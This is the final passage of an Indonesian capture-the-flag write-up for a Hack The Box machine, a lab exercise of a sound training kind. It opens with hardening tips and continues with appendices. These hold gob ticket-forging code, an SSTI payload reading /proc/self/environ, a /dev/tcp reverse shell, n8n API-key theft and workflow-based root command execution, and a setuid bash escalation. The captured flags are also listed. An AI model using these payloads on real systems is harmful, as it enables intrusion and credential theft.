### 13.4 n8n

- API key terlalu powerful; batasi scope dan rotasi.
- Jangan expose n8n API key ke service lain.
- Jalankan container sebagai non-root.
- Jangan bind-mount home user ke container root.
- Gunakan `nosuid`, `noexec` pada mount yang tidak perlu.

### 13.5 Setuid dari shared mount

- Mount volume bersama dengan `nosuid` dan `noexec`.
- Jangan biarkan container root bisa `chown root:root` file di host home.
- Audit binary setuid baru.

---

## 14. Appendix A — Full scripts

### A.1 Gob package

`/tmp/gobtest/gob/gob.go`:

```go
package gob

type VerifyTicketAuthenticity struct {
    Data []byte
}
```

### A.2 Encoder

`/tmp/gobtest/enc/main.go`:

```go
package main

import (
    "bytes"
    "encoding/gob"
    "fmt"
    "os"

    mgob "gobtest/gob"
)

func main() {
    gob.Register(&mgob.VerifyTicketAuthenticity{})

    var v any = &mgob.VerifyTicketAuthenticity{Data: []byte(os.Args[1])}

    var b bytes.Buffer
    if err := gob.NewEncoder(&b).Encode(&v); err != nil {
        panic(err)
    }
    fmt.Printf("%x", b.Bytes())
}
```

Build:

```bash
cd /tmp/gobtest
go mod init gobtest
go build -o enc/enc ./enc
```

### A.3 Decoder

`/tmp/gobtest/dec/main.go`:

```go
package main

import (
    "bytes"
    "encoding/gob"
    "fmt"
    "os"

    mgob "gobtest/gob"
)

func main() {
    gob.Register(&mgob.VerifyTicketAuthenticity{})

    raw, _ := os.ReadFile(os.Args[1])
    var v any
    err := gob.NewDecoder(bytes.NewReader(raw[:len(raw)-32])).Decode(&v)
    fmt.Println("err:", err)

    if t, ok := v.(*mgob.VerifyTicketAuthenticity); ok {
        fmt.Println(string(t.Data))
    }
}
```

Build/run:

```bash
cd /tmp/gobtest
go build -o dec/dec ./dec
./dec/dec /tmp/qr.bin
```

### A.4 Forge script

`/tmp/forge.py` — lihat section 7.3.

### A.5 Reverse shell listener

```bash
nc -lvnp 4455
```

Atau dengan tmux untuk agent/non-interaktif:

```bash
tmux new-session -d -s rev 'nc -lvnp 4455'
tmux send-keys -t rev 'id' Enter
tmux capture-pane -pt rev
```

---

## 15. Appendix B — Raw HTTP examples

### B.1 Sign-up

```http
POST /sign-up HTTP/1.1
Host: takeoff.htb
Content-Type: application/x-www-form-urlencoded

name=Test+User&email=test%40test.htb&password=Password123&terms=on
```

Response:

```http
HTTP/1.1 303 See Other
Location: /sign-in?registered=true
```

### B.2 Sign-in

```http
POST /sign-in HTTP/1.1
Host: takeoff.htb
Content-Type: application/x-www-form-urlencoded

email=test%40test.htb&password=Password123
```

Response:

```http
HTTP/1.1 303 See Other
Location: /dashboard
Set-Cookie: session_token=eyJhbGciOiJIUzI1NiIs...; Path=/; HttpOnly; SameSite=Lax
```

### B.3 Booking

```http
POST /book/start HTTP/1.1
Host: takeoff.htb
Cookie: session_token=...
Content-Type: application/x-www-form-urlencoded

schedule_id=5460&seat_ids=81
```

Response:

```http
HTTP/1.1 303 See Other
Location: /book/VCG7Y7/passengers
```

### B.4 Notes SSTI

```http
POST /tickets/VCG7Y7/notes HTTP/1.1
Host: takeoff.htb
Cookie: session_token=...
Content-Type: application/x-www-form-urlencoded

notes=%7B%7B+.File+%22%2Fproc%2Fself%2Fenviron%22+%7D%7D
```

### B.5 Forged check-in

```http
POST /api/check-in HTTP/1.1
Host: takeoff.htb
Content-Type: application/x-www-form-urlencoded

qr_data=<base64_gob_hmac>&gate=WEB
```

Response:

```http
HTTP/1.1 302 Found
Location: /check-in?msg=Test+User+checked+in+successfully
Content-Type: application/json

{"decoded":{...},"status":"ok"}
```

### B.6 n8n create workflow

```http
POST /api/v1/workflows HTTP/1.1
Host: 127.0.0.1:5678
X-N8N-API-KEY: eyJ...
Content-Type: application/json

{...workflow json...}
```

### B.7 n8n activate

```http
POST /api/v1/workflows/<id>/activate HTTP/1.1
Host: 127.0.0.1:5678
X-N8N-API-KEY: eyJ...
```

### B.8 n8n webhook

```http
GET /webhook/pwncheck HTTP/1.1
Host: 127.0.0.1:5678
```

Response:

```json
{"exitCode":0,"stderr":"","stdout":"uid=0(root)...\n425061120d296698a5160a3075473eb8\nDONE"}
```

---

## 16. Appendix C — Command cheat sheet

### Recon

```bash
nmap -Pn -sC -sV -p- --min-rate 2000 -oN nmap_full.txt 10.129.55.240
feroxbuster -u http://takeoff.htb -w /usr/share/wordlists/dirb/common.txt -C 404 -t 30
```

### Auth

```bash
curl -s -i -c cookies.txt -X POST http://takeoff.htb/sign-up \
  -d 'name=Test User&email=test@test.htb&password=Password123&terms=on'

curl -s -i -c cookies.txt -b cookies.txt -X POST http://takeoff.htb/sign-in \
  -d 'email=test@test.htb&password=Password123'
```

### Booking

```bash
curl -s -b cookies.txt -X POST http://takeoff.htb/payment-cards \
  -d 'pan=4242424242424242&cardholder_name=Test User&exp_month=12&exp_year=2030'

curl -s -i -b cookies.txt -X POST http://takeoff.htb/book/start \
  -d 'schedule_id=5460&seat_ids=81'

curl -s -b cookies.txt -X POST http://takeoff.htb/book/VCG7Y7/passengers \
  --data-urlencode 'full_name=Test User' \
  --data-urlencode 'dob=1990-01-01' \
  --data-urlencode 'id_type=passport' \
  --data-urlencode 'id_number=P1234567'

curl -s -i -b cookies.txt -X POST http://takeoff.htb/book/VCG7Y7/payment \
  -d 'payment_card_id=1'
```

### SSTI

```bash
curl -s -b cookies.txt -X POST http://takeoff.htb/tickets/VCG7Y7/notes \
  --data-urlencode 'notes={{ .File "/proc/self/environ" }}'

curl -s -b cookies.txt http://takeoff.htb/tickets/VCG7Y7/download -o /tmp/ssti.pdf
pdftotext -raw /tmp/ssti.pdf - | sed -n '/Notes/,/Scan QR/p'
```

### RCE

```bash
python3 -m http.server 8000 --bind 10.10.15.81
python3 /tmp/forge.py "curl -s http://10.10.15.81:8000/rce-confirm"

nc -lvnp 4455
python3 /tmp/forge.py "bash -c 'bash -i >& /dev/tcp/10.10.15.81/4455 0>&1 &'"
```

### n8n

```bash
PID=$(pgrep -f '/opt/htb-airways/booking/htb-air' | head -1)
KEY=$(tr '\0' '\n' < /proc/$PID/environ | sed -n 's/^N8N_API_KEY=//p')

curl -s -H "X-N8N-API-KEY: $KEY" \
  http://127.0.0.1:5678/api/v1/workflows

curl -s -H "X-N8N-API-KEY: $KEY" \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/wf.json \
  http://127.0.0.1:5678/api/v1/workflows

WFID=<id>
curl -s -X POST -H "X-N8N-API-KEY: $KEY" \
  "http://127.0.0.1:5678/api/v1/workflows/$WFID/activate"

curl -s http://127.0.0.1:5678/webhook/pwncheck
```

### Privesc

```bash
ssh -i /tmp/kpark_key kpark@10.129.55.240 \
  'cp /bin/bash /home/kpark/pwnbash'

# via n8n Execute Command:
# chown root:root /root/pwnbash
# chmod 4755 /root/pwnbash
# true

ssh -i /tmp/kpark_key kpark@10.129.55.240
/home/kpark/pwnbash -p
cat /root/root.txt
```

---

## 17. Cleanup

```bash
# hapus setuid bash
ssh -i /tmp/kpark_key kpark@10.129.55.240 'rm -f /home/kpark/pwnbash'

# hapus authorized_keys
ssh -i /tmp/kpark_key kpark@10.129.55.240 'rm -f /home/kpark/.ssh/authorized_keys'

# hapus workflow n8n; jalankan dari shell www-data
KEY=$(tr '\0' '\n' < /proc/$PID/environ | sed -n 's/^N8N_API_KEY=//p')
curl -s -X DELETE -H "X-N8N-API-KEY: $KEY" \
  http://127.0.0.1:5678/api/v1/workflows/<workflow-id>
```

---

## 18. Flag summary

```text
user.txt : 425061120d296698a5160a3075473eb8
root.txt : 9f70e9684c84a1d38232e2ceabf184a1
```

**Status: SOLVED 2026-11-01 04:21:53.**
